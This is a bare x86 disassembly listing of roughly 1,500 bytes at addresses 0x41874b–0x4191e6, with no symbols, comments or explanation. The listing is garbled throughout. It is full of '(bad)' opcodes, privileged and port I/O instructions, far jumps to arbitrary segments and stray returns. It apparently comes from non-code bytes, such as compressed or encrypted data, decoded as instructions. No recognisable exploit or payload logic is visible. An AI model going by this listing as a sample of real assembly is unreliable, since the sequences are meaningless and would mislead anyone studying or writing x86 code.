  41874b:	add    BYTE PTR [esi+ebp*2-0x62122bc9],bl
  418752:	adc    esp,ecx
  418754:	pushf  
  418755:	cmp    eax,0x149dc46d
  41875a:	cdq    
  41875b:	xchg   ebp,eax
  41875c:	push   ebp
  41875d:	std    
  41875e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41875f:	rol    DWORD PTR [ecx+0x2d4fe3f0],1
  418765:	push   ebp
  418766:	or     al,0x4e
  418768:	pusha  
  418769:	and    al,0xc2
  41876b:	sub    BYTE PTR [eax+0x615f6cfa],ah
  418771:	fs pop ebp
  418773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418774:	add    eax,0xe36b610
  418779:	dec    ecx
  41877a:	sbb    DWORD PTR [edi+0x7d],edx
  41877d:	add    ecx,DWORD PTR [ebp-0x65]
  418780:	inc    ebx
  418781:	test   edx,esp
  418783:	ror    ebp,0xc9
  418786:	add    DWORD PTR [ecx+0x3c8ce9c8],esp
  41878c:	mov    DWORD PTR [esi],ecx
  41878e:	dec    DWORD PTR [esi+ebp*1+0x47]
  418792:	out    0xdf,al
  418794:	cmp    eax,0x4176d6cc
  418799:	cwde   
  41879a:	clc    
  41879b:	xlat   BYTE PTR ds:[ebx]
  41879c:	lea    ecx,[ebp-0x72]
  41879f:	lods   al,BYTE PTR ds:[esi]
  4187a0:	pusha  
  4187a1:	leave  
  4187a2:	pop    eax
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	inc    ebp
  4187a5:	mov    ds:0x5b376f89,eax
  4187aa:	push   esp
  4187ab:	out    dx,al
  4187ac:	xor    al,0xb
  4187ae:	(bad)  
  4187b0:	add    ah,BYTE PTR [ebx+ebp*8]
  4187b3:	jmp    0xecd9:0x3aef2974
  4187ba:	push   esi
  4187bb:	add    edx,DWORD PTR [ecx-0x19]
  4187be:	jge    0x418812
  4187c0:	std    
  4187c1:	cdq    
  4187c2:	mov    al,0x23
  4187c4:	psrad  mm0,QWORD PTR [ebp+0x342eb611]
  4187cb:	inc    ebx
  4187cc:	mov    cl,0xbd
  4187ce:	sar    bl,cl
  4187d0:	repz aam 0x96
  4187d3:	dec    edi
  4187d4:	mov    ah,0x9b
  4187d6:	xchg   ebx,eax
  4187d7:	or     dh,BYTE PTR [eax]
  4187d9:	(bad)  
  4187da:	sti    
  4187db:	jg     0x41882b
  4187dd:	jp     0x418814
  4187df:	cmc    
  4187e0:	xchg   edx,eax
  4187e1:	aad    0xd3
  4187e3:	cmp    DWORD PTR [edi+0x637fee3a],edi
  4187e9:	or     esi,ebp
  4187eb:	and    edi,edx
  4187ed:	jnp    0x41882f
  4187ef:	popa   
  4187f0:	mov    esp,0x595c234
  4187f5:	cs test al,0xb1
  4187f8:	fs cdq 
  4187fa:	or     ch,dh
  4187fc:	xchg   edi,eax
  4187fd:	xor    al,0xee
  4187ff:	sbb    BYTE PTR [ebx+0x15],ch
  418802:	xor    eax,0x82a32839
  418807:	jbe    0x418886
  418809:	es call 0x324d58fc
  41880f:	and    eax,0x57a85db7
  418814:	sbb    esi,DWORD PTR [ebx+0x7a567567]
  41881a:	adc    al,0x46
  41881c:	inc    ebx
  41881d:	retf   
  41881e:	push   esi
  41881f:	scas   eax,DWORD PTR es:[edi]
  418820:	or     bl,BYTE PTR [edi-0x5ecc93fc]
  418826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418827:	sbb    DWORD PTR [esi+ebp*4-0x646e2f3],esp
  41882e:	or     BYTE PTR [ebx],bh
  418830:	xchg   ebp,eax
  418831:	xchg   edx,eax
  418832:	jmp    0x8e987d8f
  418837:	mov    esi,0x7532377c
  41883c:	sub    ebx,edx
  41883e:	or     al,0x49
  418840:	mov    BYTE PTR [eax],al
	...
  4188b2:	add    BYTE PTR [eax],al
  4188b4:	pop    eax
  4188b5:	inc    ecx
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xde753732,al
  4188c3:	mov    bl,bh
  4188c5:	or     al,BYTE PTR [ecx]
  4188c7:	add    ch,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    al,ch
  4188cd:	mov    ebp,DWORD PTR [ecx-0xa]
  4188d0:	cmp    ch,BYTE PTR [eax]
  4188d2:	add    al,0xf5
  4188d4:	clc    
  4188d5:	jnp    0x4188c7
  4188d7:	in     al,dx
  4188d8:	frstor [esi]
  4188da:	stc    
  4188db:	sub    ecx,DWORD PTR [edi]
  4188dd:	imul   eax,edi,0xffffffff
  4188e0:	inc    eax
  4188e1:	sahf   
  4188e2:	xchg   ecx,eax
  4188e3:	popa   
  4188e4:	sahf   
  4188e5:	xchg   edi,eax
  4188e6:	mov    ebp,DWORD PTR [eax]
  4188e8:	xchg   esi,eax
  4188e9:	clc    
  4188ea:	mov    ds:0x823472b,eax
  4188ef:	sbb    esp,eax
  4188f1:	inc    esp
  4188f2:	arpl   WORD PTR [edi-0x16],dx
  4188f5:	sbb    DWORD PTR [ebx],0x54
  4188f8:	pop    es
  4188f9:	lahf   
  4188fa:	dec    esp
  4188fb:	push   eax
  4188fc:	mov    eax,DWORD PTR [esp+ebx*4+0x65]
  418900:	sbb    esi,esp
  418902:	(bad)  
  418903:	mov    al,0x3b
  418905:	adc    eax,0xf974151
  41890a:	cld    
  41890b:	repz sub ch,ah
  41890e:	and    eax,esi
  418910:	jb     0x4188a9
  418912:	push   0x317a88f7
  418917:	ds cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41891a:	jno    0x41898a
  41891c:	out    dx,al
  41891d:	push   eax
  41891e:	loope  0x418913
  418920:	out    0x4,al
  418922:	sub    BYTE PTR [esi],ch
  418924:	sub    ah,BYTE PTR [ecx]
  418926:	ror    BYTE PTR ds:0x98c5a510,0x10
  41892d:	aam    0xbd
  41892f:	mov    ebx,0x1b2bf817
  418934:	inc    edx
  418935:	cmp    eax,0xf0cd7df3
  41893a:	dec    ebx
  41893b:	jbe    0x4188fc
  41893d:	fdiv   st,st(6)
  41893f:	jp     0x41897b
  418941:	shl    DWORD PTR [ebx-0x37],0xcb
  418945:	push   ebp
  418946:	cmp    ecx,DWORD PTR [edx-0x3778d728]
  41894c:	mov    esp,DWORD PTR [edi+0x4f]
  41894f:	xor    edx,DWORD PTR ds:0xdc07fc10
  418955:	cmp    eax,0x8c73f548
  41895a:	ror    DWORD PTR [edx],cl
  41895c:	xchg   DWORD PTR [ebx-0x56],ebp
  41895f:	lahf   
  418960:	inc    ebp
  418961:	sub    DWORD PTR [esi],edi
  418963:	mov    bl,0x22
  418965:	jecxz  0x41898a
  418967:	mov    esp,0xabb17b58
  41896c:	ror    edi,cl
  41896e:	nop
  41896f:	rsqrtps xmm2,XMMWORD PTR [ecx]
  418972:	mov    edx,0xdd4385fd
  418977:	mov    ebp,0xd77e7aa1
  41897c:	outs   dx,DWORD PTR ds:[esi]
  41897d:	sub    BYTE PTR [esi+0x48],0x6d
  418981:	add    BYTE PTR [edi],cl
  418983:	mov    db3,ecx
  418986:	inc    ecx
  418987:	scas   al,BYTE PTR es:[edi]
  418988:	jns    0x418978
  41898a:	cmp    ch,BYTE PTR [edi]
  41898c:	push   ss
  41898d:	in     eax,0x6d
  41898f:	jmp    0xab96:0xb6018403
  418996:	stos   DWORD PTR es:[edi],eax
  418997:	pop    eax
  418998:	xchg   ecx,ecx
  41899a:	dec    ecx
  41899b:	sbb    DWORD PTR [eax+0x31fc77e6],ecx
  4189a1:	xchg   edi,eax
  4189a2:	fisub  DWORD PTR [edi-0x65]
  4189a5:	and    DWORD PTR [edx-0x757f8408],0x86e27aeb
  4189af:	jb     0x4189ba
  4189b1:	or     eax,0x2b513517
  4189b6:	jns    0x418990
  4189b8:	mov    ecx,0xa5083931
  4189bd:	dec    eax
  4189be:	push   edx
  4189bf:	in     eax,dx
  4189c0:	sub    eax,DWORD PTR [eax]
	...
  418a32:	add    BYTE PTR [eax],al
  418a34:	das    
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	jno    0x4189d8
  418a42:	pushf  
  418a43:	imul   edx,esp,0xf500010b
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [ecx-0x22],dh
  418a4e:	outs   dx,DWORD PTR ds:[esi]
  418a4f:	xchg   edi,eax
  418a50:	adc    DWORD PTR [esi-0x6],ebp
  418a53:	sub    dl,BYTE PTR [esi+eax*4+0x52]
  418a57:	or     DWORD PTR [ecx-0xf],ebx
  418a5a:	test   al,0xf6
  418a5c:	xchg   edx,eax
  418a5d:	(bad)  
  418a5e:	push   0xb7251fc
  418a63:	ret    
  418a64:	repz adc al,0xa2
  418a67:	(bad)  
  418a68:	xchg   BYTE PTR [edx-0x48],dh
  418a6b:	inc    ebp
  418a6c:	mov    BYTE PTR [ebx+0x68],al
  418a6f:	add    DWORD PTR [ebp-0x3a3e7a52],ecx
  418a75:	mov    bl,0xc2
  418a77:	dec    ebx
  418a78:	push   ecx
  418a79:	dec    esi
  418a7a:	or     al,0xc7
  418a7c:	jns    0x418a27
  418a7e:	lock leave 
  418a80:	shl    DWORD PTR [ebx+0x34],1
  418a83:	xor    eax,DWORD PTR [ebx+0x2549d42f]
  418a89:	push   0x17177c5
  418a8e:	es inc ebp
  418a90:	ret    
  418a91:	repnz cld 
  418a93:	mov    esp,edi
  418a95:	mov    edx,0x550f31c9
  418a9a:	adc    edi,0x999125f
  418aa0:	mov    eax,0x97b1d8e9
  418aa5:	aaa    
  418aa6:	int    0xa
  418aa8:	cmp    bl,cl
  418aaa:	add    al,BYTE PTR [esi-0x75a7778b]
  418ab0:	inc    ebx
  418ab1:	jno    0x418b04
  418ab3:	aaa    
  418ab4:	stc    
  418ab5:	adc    cl,dl
  418ab7:	in     eax,dx
  418ab8:	das    
  418ab9:	pop    edx
  418aba:	pop    eax
  418abb:	test   dh,cl
  418abd:	aam    0x4c
  418abf:	add    bl,BYTE PTR [eax+0x13efe200]
  418ac5:	outs   dx,BYTE PTR ds:[esi]
  418ac6:	adc    edx,DWORD PTR [edx]
  418ac8:	fs out dx,eax
  418aca:	daa    
  418acb:	inc    ebx
  418acc:	jne    0x418a72
  418ace:	mov    ds:0x6e3ee061,eax
  418ad3:	pop    ss
  418ad4:	hlt    
  418ad5:	and    BYTE PTR [ecx-0x69],cl
  418ad8:	jnp    0x418a7f
  418ada:	in     al,dx
  418adb:	retf   
  418adc:	pop    edi
  418add:	sub    DWORD PTR ds:0x198242d0,ebp
  418ae3:	dec    edx
  418ae4:	ret    
  418ae5:	or     cl,dl
  418ae7:	xor    esi,DWORD PTR [esi-0x7a2b087b]
  418aed:	icebp  
  418aee:	mov    WORD PTR [ebp+0x519f605d],fs
  418af4:	fsub   st(4),st
  418af6:	inc    esi
  418af7:	inc    ecx
  418af8:	das    
  418af9:	imul   esp,DWORD PTR [edx+0x790d75f4],0x2
  418b00:	jno    0x418b01
  418b02:	ss pop ebx
  418b04:	xchg   DWORD PTR [esi+0x59],ebx
  418b07:	loop   0x418a9e
  418b09:	adc    DWORD PTR [ecx],edi
  418b0b:	cmc    
  418b0c:	aam    0x15
  418b0e:	mov    ebp,DWORD PTR [esi+0x72]
  418b11:	adc    DWORD PTR [ebx],esi
  418b13:	ror    BYTE PTR [eax-0x63da71c6],cl
  418b19:	add    al,0x2b
  418b1b:	aam    0xd0
  418b1d:	xlat   BYTE PTR ds:[ebx]
  418b1e:	out    0x41,al
  418b20:	in     eax,0x32
  418b22:	mov    DWORD PTR [esi-0xf4382e2],esi
  418b28:	sub    BYTE PTR ds:0xc6bae746,ah
  418b2e:	in     eax,dx
  418b2f:	scas   eax,DWORD PTR es:[edi]
  418b30:	stos   BYTE PTR es:[edi],al
  418b31:	push   cs
  418b32:	ret    
  418b33:	jecxz  0x418b09
  418b35:	inc    esi
  418b36:	pop    es
  418b37:	add    al,0xb8
  418b39:	in     eax,dx
  418b3a:	leave  
  418b3b:	sbb    al,0x83
  418b3d:	push   edi
  418b3e:	adc    bh,BYTE PTR [ecx]
  418b40:	or     eax,0x0
	...
  418bb1:	add    BYTE PTR [eax],al
  418bb3:	add    BYTE PTR [ecx-0x267b6f40],cl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	(bad)  
  418bc1:	pop    ecx
  418bc2:	and    DWORD PTR [eax],ecx
  418bc4:	leave  
  418bc5:	or     al,0x1
  418bc7:	add    ch,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [ecx+0x61],al
  418bce:	or     esi,DWORD PTR [edi-0x2d0c0cd6]
  418bd4:	aam    0xfb
  418bd6:	cmp    BYTE PTR [edx-0x344a74de],dl
  418bdc:	dec    edi
  418bdd:	mov    ebx,0xbad5952
  418be2:	pop    esi
  418be3:	(bad)  
  418be4:	mov    dh,0xcd
  418be6:	mul    DWORD PTR [ebp-0x55ebff4a]
  418bec:	push   es
  418bed:	inc    edx
  418bee:	out    0x18,eax
  418bf0:	std    
  418bf1:	and    al,0x58
  418bf3:	icebp  
  418bf4:	xchg   edx,eax
  418bf5:	xor    eax,0xdac524e0
  418bfa:	mov    DWORD PTR [edx+0x1],esi
  418bfd:	jne    0x418b90
  418bff:	mov    ecx,0x3a643da1
  418c04:	sub    dl,BYTE PTR [esi+0x5f861087]
  418c0a:	ja     0x418c7f
  418c0c:	sub    dl,0x3f
  418c0f:	dec    esi
  418c10:	xchg   edi,eax
  418c11:	shl    DWORD PTR [ebp-0x6d],cl
  418c14:	bnd jg 0x418bd5
  418c17:	jb     0x418be1
  418c19:	ds stos BYTE PTR es:[edi],al
  418c1b:	jmp    0xfb82:0x57df4689
  418c22:	mov    eax,ds:0xb7ac2989
  418c27:	stos   BYTE PTR es:[edi],al
  418c28:	ja     0x418c09
  418c2a:	(bad)  [esi]
  418c2c:	mov    ds:0x898701ca,al
  418c31:	dec    ecx
  418c32:	test   DWORD PTR [ebp+0x33],ebp
  418c35:	cdq    
  418c36:	mov    eax,ds:0xfc264ae8
  418c3b:	jno    0x418c6a
  418c3d:	popa   
  418c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c3f:	push   ebp
  418c40:	sbb    edx,DWORD PTR [esi+0x283ff48f]
  418c46:	(bad)  
  418c47:	sar    BYTE PTR [edi-0x26],cl
  418c4a:	mov    ebx,0x699bddd1
  418c4f:	xchg   edx,eax
  418c50:	or     al,0x54
  418c52:	sbb    dl,dh
  418c54:	rol    esp,1
  418c56:	sbb    ax,0xd65f
  418c5a:	aad    0x4d
  418c5c:	cmp    bh,BYTE PTR [ebp+0x2f]
  418c5f:	jno    0x418c50
  418c61:	or     BYTE PTR [eax+0xf],dh
  418c64:	arpl   di,di
  418c66:	test   al,0x3e
  418c68:	pop    ebx
  418c69:	push   ebx
  418c6a:	(bad)
  418c6e:	mov    bl,0x26
  418c70:	fsub   DWORD PTR ds:0x79bac8b5
  418c76:	retf   
  418c77:	and    BYTE PTR [ebx-0x5c],dh
  418c7a:	repz cmp al,0xf2
  418c7d:	push   0x67
  418c7f:	imul   DWORD PTR [ebx-0x63]
  418c82:	cmp    eax,0x31c0d939
  418c87:	ret    
  418c88:	rcl    DWORD PTR [ebx+0x4e718b55],1
  418c8e:	sbb    DWORD PTR [ecx+0x4e50efa4],eax
  418c94:	or     al,BYTE PTR [edi+0x59]
  418c97:	inc    ecx
  418c98:	sub    ah,cl
  418c9a:	(bad)  
  418c9b:	(bad)  
  418c9c:	xor    DWORD PTR [edi-0x2e6647bc],esp
  418ca2:	mov    al,0xe1
  418ca4:	test   al,0xf4
  418ca6:	cli    
  418ca7:	push   edx
  418ca8:	adc    ch,ah
  418caa:	push   0x3995c4b6
  418caf:	cli    
  418cb0:	fcmovnb st,st(0)
  418cb2:	jb     0x418c90
  418cb4:	mov    ah,0x12
  418cb6:	(bad)  
  418cb7:	sbb    al,0x6f
  418cb9:	hlt    
  418cba:	push   ds
  418cbb:	adc    BYTE PTR [ebp-0x7ceec33f],al
	...
  418d31:	add    BYTE PTR [eax],al
  418d33:	add    BYTE PTR [edi],dl
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0xfc27a61
  418d43:	xchg   ecx,eax
  418d44:	mov    esi,0xf500010d
  418d49:	add    BYTE PTR [eax],al
  418d4b:	add    bh,bl
  418d4d:	ins    BYTE PTR es:[edi],dx
  418d4e:	imul   edx,DWORD PTR [esi],0x9a05382
  418d54:	push   esp
  418d55:	push   0xfa24647d
  418d5a:	push   ss
  418d5b:	pop    edx
  418d5c:	sbb    BYTE PTR [ebx-0x70075f84],0x1d
  418d63:	xchg   ebp,eax
  418d64:	mov    eax,ds:0xbcddef41
  418d69:	retf   
  418d6a:	jae    0x418dd0
  418d6c:	and    BYTE PTR [esi-0x124e6248],0xd3
  418d73:	bnd js 0x418d7d
  418d76:	arpl   WORD PTR [edi+0x7ffa4478],si
  418d7c:	dec    ecx
  418d7d:	leave  
  418d7e:	mov    bh,0x56
  418d80:	ds jg  0x418d8d
  418d83:	push   ebx
  418d84:	lock adc ecx,DWORD PTR [ecx+0x45]
  418d88:	out    0xda,eax
  418d8a:	cmp    DWORD PTR [ebp-0x5b71851f],edx
  418d90:	dec    esp
  418d91:	xchg   edx,eax
  418d92:	sub    al,0x6c
  418d94:	or     DWORD PTR [esi+edi*4-0x80],eax
  418d98:	pushf  
  418d99:	mov    DWORD PTR [ebx+0x64],ebx
  418d9c:	inc    esp
  418d9d:	dec    esp
  418d9e:	ret    
  418d9f:	or     eax,0x460de7bc
  418da4:	jl     0x418d51
  418da6:	shr    DWORD PTR [eax+0x2a],cl
  418da9:	mov    dl,0xc5
  418dab:	jo     0x418dfa
  418dad:	retf   
  418dae:	cli    
  418daf:	imul   esp,DWORD PTR [eax+0x2f],0x11
  418db3:	loopne 0x418d99
  418db5:	mov    dh,0x50
  418db7:	add    DWORD PTR [eax+0x45],ecx
  418dba:	mov    ecx,0xa16296c4
  418dbf:	call   0x33ef0e1a
  418dc4:	sbb    BYTE PTR [ebx],0x3e
  418dc7:	dec    esp
  418dc8:	dec    ecx
  418dc9:	out    dx,al
  418dca:	mov    cl,0x49
  418dcc:	aas    
  418dcd:	sbb    BYTE PTR [edx+0x180a452],bl
  418dd3:	mov    dh,0xaf
  418dd5:	in     al,0x93
  418dd7:	scas   eax,DWORD PTR es:[di]
  418dd9:	jl     0x418dfb
  418ddb:	loope  0x418e17
  418ddd:	popa   
  418dde:	inc    edx
  418ddf:	div    DWORD PTR [ebx+0x6d5b45e6]
  418de5:	xchg   ebx,eax
  418de6:	(bad)  
  418de7:	iret   
  418de8:	inc    ebx
  418de9:	test   DWORD PTR [edx+0x48048025],0x68b887b9
  418df3:	nop
  418df4:	or     ch,0x41
  418df7:	pop    edx
  418df8:	cmp    DWORD PTR [esi-0x56a89f29],ebx
  418dfe:	jl     0x418e4c
  418e00:	and    DWORD PTR ds:0xa4d418d5,ebp
  418e06:	ins    DWORD PTR es:[edi],dx
  418e07:	das    
  418e08:	xchg   edi,eax
  418e09:	imul   esp,DWORD PTR [edi+0x6a],0xfffffff2
  418e0d:	out    dx,al
  418e0e:	shl    BYTE PTR [ecx-0x45],1
  418e11:	test   ch,cl
  418e13:	dec    edi
  418e14:	(bad)  
  418e15:	retf   0xabf
  418e18:	cli    
  418e19:	es inc ebx
  418e1b:	xchg   ebp,eax
  418e1c:	pop    edx
  418e1d:	xchg   edx,eax
  418e1e:	cmp    DWORD PTR [ebx+0x3c],ecx
  418e21:	push   ebx
  418e22:	push   ss
  418e23:	xor    BYTE PTR [esi-0x6d],dl
  418e26:	sub    BYTE PTR [ebx-0x338a4daf],al
  418e2c:	sbb    DWORD PTR [edx],edi
  418e2e:	pop    ecx
  418e2f:	mov    ecx,cs
  418e31:	jmp    0xf8cd248b
  418e36:	hlt    
  418e37:	pop    es
  418e38:	sub    al,0xc8
  418e3a:	mov    dh,0x8a
  418e3c:	or     eax,0xf2c44619
	...
  418eb1:	add    BYTE PTR [eax],al
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	push   cs
  418ec1:	pop    eax
  418ec2:	mov    edx,0x10eb3f1
  418ec7:	add    ch,dh
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    al,ah
  418ecd:	adc    ebp,DWORD PTR [eax]
  418ecf:	mov    esp,0xc7fc8286
  418ed4:	sub    al,0x78
  418ed6:	arpl   WORD PTR [eax-0x2e],cx
  418ed9:	xor    ebx,DWORD PTR [ebx+0x64a05db4]
  418edf:	mov    dl,0xc2
  418ee1:	push   es
  418ee2:	outs   dx,BYTE PTR ds:[esi]
  418ee3:	xchg   ebp,eax
  418ee4:	mov    dh,0xa9
  418ee6:	pop    ecx
  418ee7:	and    ah,bh
  418ee9:	add    esi,esi
  418eeb:	add    eax,0x638097bd
  418ef0:	sub    eax,DWORD PTR [edi-0x73966b37]
  418ef6:	loop   0x418f3c
  418ef8:	ins    BYTE PTR es:[edi],dx
  418ef9:	jo     0x418ee8
  418efb:	xor    al,0x59
  418efd:	mov    eax,0xb8203729
  418f02:	mov    al,ds:0xa6b4d094
  418f07:	jmp    0x418e8c
  418f09:	mov    ecx,0x64528d50
  418f0e:	sbb    al,0x8a
  418f10:	jge    0x418f00
  418f12:	imul   esi,DWORD PTR [esp+edx*2-0x10],0x2cef5a7e
  418f1a:	sbb    BYTE PTR [eax],dl
  418f1c:	les    esp,FWORD PTR [ebp+0x733b1be7]
  418f22:	push   0xb58c86a9
  418f27:	pushf  
  418f28:	jmp    0x6156:0x1f59b422
  418f2f:	int    0xc3
  418f31:	xchg   edi,eax
  418f32:	enterw 0x91ba,0x73
  418f37:	(bad)  
  418f38:	leave  
  418f39:	loop   0x418edc
  418f3b:	mov    ds:0x48239cca,al
  418f40:	add    ch,al
  418f42:	sub    al,0x2c
  418f44:	pop    ebx
  418f45:	jne    0x418f12
  418f47:	xchg   DWORD PTR [ebp-0x5b],ebp
  418f4a:	lods   eax,DWORD PTR ds:[esi]
  418f4b:	jno    0x418f78
  418f4d:	setns  bh
  418f50:	ja     0x418fa6
  418f52:	add    al,ch
  418f54:	daa    
  418f55:	push   ecx
  418f56:	imul   edx,DWORD PTR [esi+0x3f],0xfffffffb
  418f5a:	aas    
  418f5b:	add    DWORD PTR ds:[ecx],ecx
  418f5e:	imul   edi,DWORD PTR [edx+0x3c],0xee9f786a
  418f65:	xchg   DWORD PTR [ecx+edi*2-0x54],ebx
  418f69:	adc    DWORD PTR [eax],ebx
  418f6b:	stc    
  418f6c:	repz push cs
  418f6e:	(bad)  
  418f6f:	pop    esp
  418f70:	push   edi
  418f71:	cmp    bl,BYTE PTR [ebx]
  418f73:	xchg   ebx,eax
  418f74:	mov    cl,0x9e
  418f76:	sub    eax,edi
  418f78:	jno    0x418f1d
  418f7a:	inc    ecx
  418f7b:	int3   
  418f7c:	jnp    0x418f5b
  418f7e:	out    dx,al
  418f7f:	push   esp
  418f80:	aaa    
  418f81:	in     eax,dx
  418f82:	mov    esp,0x4037978
  418f87:	enter  0xf979,0x5a
  418f8b:	pop    ebp
  418f8c:	int    0x8e
  418f8e:	lods   eax,DWORD PTR ds:[esi]
  418f8f:	jnp    0x418f48
  418f91:	xor    edi,edi
  418f93:	jl     0x418f9f
  418f95:	outs   dx,DWORD PTR ds:[esi]
  418f96:	cmp    al,0xaa
  418f98:	pop    ss
  418f99:	mov    dh,0x9c
  418f9b:	and    al,0xa8
  418f9d:	sub    BYTE PTR [ecx+0x356fb838],ah
  418fa3:	mov    al,ds:0x6e758c86
  418fa8:	or     DWORD PTR [eax],eax
  418faa:	aaa    
  418fab:	jge    0x418f3f
  418fad:	or     DWORD PTR [esi+0x62],0xffffff91
  418fb1:	adc    al,0x2
  418fb3:	out    0x38,eax
  418fb5:	sub    al,0xd6
  418fb7:	out    dx,eax
  418fb8:	retf   0xaf2a
  418fbb:	xchg   ebp,eax
  418fbc:	mov    ebx,es
  418fbe:	js     0x418f75
  418fc0:	pop    eax
	...
  419031:	add    BYTE PTR [eax],al
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shr    BYTE PTR [ecx-0x57074a60],cl
  419045:	sgdtd  [eax]
  419048:	cmc    
  419049:	add    BYTE PTR [eax],al
  41904b:	add    BYTE PTR [eax],cl
  41904d:	add    dh,ch
  41904f:	add    eax,0xbb4cc8a8
  419054:	jmp    0x86a3:0x1029f5ab
  41905b:	add    DWORD PTR [ecx],edx
  41905d:	xchg   ebp,eax
  41905e:	cvttps2pi mm6,QWORD PTR ds:0x79507a86
  419065:	add    ecx,DWORD PTR [ecx+0x75]
  419068:	std    
  419069:	sbb    edx,DWORD PTR [edi-0x35419c01]
  41906f:	cmp    DWORD PTR [eax-0x36749384],ebx
  419075:	addr16 and ebp,eax
  419078:	js     0x419012
  41907a:	hlt    
  41907b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907c:	sub    esp,eax
  41907e:	mov    WORD PTR [ebx],es
  419080:	and    DWORD PTR [esi-0x61],edx
  419083:	leave  
  419084:	xchg   BYTE PTR [ecx],ah
  419086:	fwait
  419087:	add    dh,al
  419089:	mov    ah,0x33
  41908b:	cmp    BYTE PTR [edx+ecx*8],0x1b
  41908f:	mov    bl,0xe
  419091:	push   ebx
  419092:	push   ebp
  419093:	inc    ebx
  419094:	dec    esi
  419095:	sbb    edx,DWORD PTR [esi]
  419097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419098:	cmp    ch,BYTE PTR ds:0xfa533fed
  41909e:	mov    bl,0xb7
  4190a0:	pop    ebx
  4190a1:	pop    edi
  4190a2:	daa    
  4190a3:	ins    BYTE PTR es:[edi],dx
  4190a4:	jge    0x419081
  4190a6:	js     0x419067
  4190a8:	and    DWORD PTR [edx],ecx
  4190aa:	xor    eax,0x67522120
  4190af:	or     DWORD PTR fs:[edi+0x1213bcb3],esp
  4190b6:	mov    esi,0x88a11895
  4190bb:	cs cdq 
  4190bd:	lods   eax,DWORD PTR ds:[esi]
  4190be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190bf:	bound  esp,QWORD PTR [edi]
  4190c1:	iret   
  4190c2:	jmp    DWORD PTR [ebp-0x64]
  4190c5:	mov    ch,0xcd
  4190c7:	adc    ch,bl
  4190c9:	sub    eax,0x8459f6ae
  4190ce:	loopne 0x4190ac
  4190d0:	dec    edx
  4190d1:	add    esi,DWORD PTR [esi-0x8]
  4190d4:	(bad)  
  4190d5:	loopne 0x419083
  4190d7:	mov    BYTE PTR ds:0x837c0bb3,ah
  4190dd:	push   0x881ee1e
  4190e2:	ins    DWORD PTR es:[edi],dx
  4190e3:	setl   BYTE PTR [ebx-0x3e]
  4190e7:	sub    al,0x3b
  4190e9:	cld    
  4190ea:	mov    ds:0xaf5266d2,al
  4190ef:	(bad)  
  4190f0:	lds    esp,FWORD PTR ds:0x392f15ff
  4190f6:	xchg   dh,dl
  4190f8:	or     al,0xa
  4190fa:	cmp    al,0xc8
  4190fc:	pop    edx
  4190fd:	es cld 
  4190ff:	rcr    BYTE PTR [esi+0x62],1
  419102:	in     al,0xc6
  419104:	sbb    eax,0x8bc896b5
  419109:	adc    dh,BYTE PTR [edx-0x775264a4]
  41910f:	mov    eax,ds:0x8be0bbf
  419114:	jle    0x4190c2
  419116:	push   edi
  419117:	push   ebp
  419118:	jbe    0x419120
  41911a:	jp     0x4190e7
  41911c:	xor    dh,dl
  41911e:	leave  
  41911f:	xor    BYTE PTR ds:0x5d3ae11d,cl
  419125:	aam    0xe4
  419127:	cmp    ecx,DWORD PTR [edi+0x59c3c840]
  41912d:	sbb    DWORD PTR [ecx],0x2a
  419130:	lahf   
  419131:	push   edi
  419132:	out    0x6c,al
  419134:	and    al,0x28
  419136:	xchg   DWORD PTR [esi+0x3b],edx
  419139:	xor    BYTE PTR [esi],cl
  41913b:	sbb    ebx,DWORD PTR [edi-0x671c3223]
	...
  4191b1:	add    BYTE PTR [eax],al
  4191b3:	add    BYTE PTR [edi],dh
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	inc    eax
  4191c1:	hlt    
  4191c2:	mov    ds:0x1109d6e,eax
  4191c7:	add    ch,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR ds:0xd107ed80,ah
  4191d1:	out    dx,eax
  4191d2:	xor    BYTE PTR cs:[ebx],ah
  4191d5:	stos   BYTE PTR es:[edi],al
  4191d6:	mov    edx,0x13d8d08
  4191db:	inc    ebp
  4191dc:	imul   edx,DWORD PTR ds:0x8fc3,0xd8e93d00
  4191e5:	stc    
  4191e6:	and    ah,BYTE PTR [ecx-0x3f0b8460]
